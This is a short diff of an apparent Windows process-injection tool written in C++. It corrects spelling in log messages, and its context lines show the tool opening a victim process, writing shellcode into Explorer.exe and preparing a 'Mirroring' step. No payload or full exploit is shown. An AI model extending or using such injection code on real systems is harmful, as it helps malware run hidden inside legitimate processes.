@@ -370,7 +370,7 @@ int main(int argc, char** argv)
 		std::cout << std::format("[-] Error using OpenProcess on PID {}: ERROR {}", victimPid, GetLastError()) << std::endl;
 		return -1;
 	}
-	std::cout << "[+] Got a handle to PID " << pidArg << " succesfuly" << std::endl;
+	std::cout << "[+] Got a handle to PID " << pidArg << " successfully" << std::endl;
 
 	// allocate shellcode within victim
 	DWORD_PTR shellcodeSize = sizeof(shellcode);
@@ -392,7 +392,7 @@ int main(int argc, char** argv)
 		std::cout << std::format("[-] Error writing shellcode with WriteProcessMemory on Explorer.exe : ERROR {}", GetLastError()) << std::endl;
 		return -1;
 	}
-	std::cout << "[+] Succesfuly wrote shellcode to victim. about to start the Mirroring" << std::endl;
+	std::cout << "[+] Successfully wrote shellcode to victim. about to start the Mirroring" << std::endl;
 
 
 	HMODULE lib = LoadLibraryA("ntdll.dll");
